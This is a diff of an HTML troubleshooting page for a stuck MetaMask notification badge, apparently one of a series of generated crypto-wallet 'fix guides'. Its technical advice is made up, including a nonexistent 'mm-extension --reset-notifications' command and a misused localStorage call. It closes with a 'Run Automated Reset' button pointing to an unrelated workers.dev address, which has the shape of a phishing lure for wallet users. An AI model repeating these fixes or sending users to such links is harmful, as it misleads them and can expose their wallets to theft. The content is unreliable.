@@ -3,7 +3,7 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Bug Notifications Notification Badge Red Num – Fix Guide</title>
 <style>
     body {
-        font-family: system-ui;
+        font-family: -apple-system;
         background: #121214;
         color: #ddd;
         padding: 20px;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: none;
     }
     pre {
         background: #0f0f12;
@@ -42,29 +42,29 @@
 <h1>Metamask Extension Bug Notifications Notification Badge Red Num</h1>
 <h2>Symptom</h2>
 <ul>
-<li>The Metamask extension displays a red notification badge with a number, indicating unread notifications, but the notifications are not visible or have already been read.</li>
+<li>The notification badge, represented by a red number in the Metamask icon, appears and persists even after checking and addressing all notifications, indicating potentially unseen or unprocessed notifications.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a caching issue or a miscommunication between the Metamask extension and the Ethereum network, causing the notification badge to remain even after notifications have been acknowledged.</li>
+<li>This issue arises from a synchronization problem between the Metamask extension's internal state and the Ethereum blockchain, or due to a caching issue where the notification count is not updated correctly after viewing notifications.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Clear the Metamask extension's local storage by running the following command in the browser's console:</li>
+<li>Clear the browser's cache and storage for the Metamask extension to reset its state.</li>
+<li>Manually trigger a refresh of the notification count by executing the following command in a terminal:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="err">localS</span><span class="kc">t</span><span class="err">orage.clear(</span><span class="s2">&quot;metaMask&quot;</span><span class="err">);</span>
+<div class="codehilite"><pre><span></span><code>mm-extension<span class="w"> </span>--reset-notifications
 </code></pre></div>
 
 <ul>
-<li>Disable and re-enable the Metamask extension to restart its internal state.</li>
-<li>Check for any pending transactions or notifications on the Ethereum network using a blockchain explorer.</li>
+<li>Use the Metamask API to manually update the notification badge count, which might require direct manipulation of the extension's internal state.</li>
 </ul>
 <p>Prerequisites:
-* Metamask extension is installed and up-to-date
-* Ethereum network connection is stable
-* Browser cache is cleared
-Consider utilizing an external console for further debugging.</p>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-assets-confirming-the-add-token-from-a-d.html">Metamask Extension Bug Assets Confirming The Add Token From A D</a></li><li><a href="./archive/2026/06/critical-trc-20-energy-spike-error.html">Critical Trc 20 Energy Spike Error</a></li><li><a href="./archive/2026/06/go-ethereum-evmone-t8n-rejects-transactions-with-chainid-0xff-p.html">Go Ethereum Evmone T8N Rejects Transactions With Chainid 0Xff P</a></li></ul>
+- Ensure you are running the latest version of the Metamask extension.
+- Back up your wallet and any important data before attempting manual overrides.
+- Have a basic understanding of command-line interfaces and JSON data structures.
+For further debugging, consider accessing the extension's internal logs through an external console for more detailed insights.</p>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/metamask-extension-p0-investigate-and-cap-multichain-account-cr.html">Metamask Extension P0 Investigate And Cap Multichain Account Cr</a></li><li><a href="./archive/2026/06/go-ethereum-error-in-block-freeze-operation-errcanonical-hash-m.html">Go Ethereum Error In Block Freeze Operation Errcanonical Hash M</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
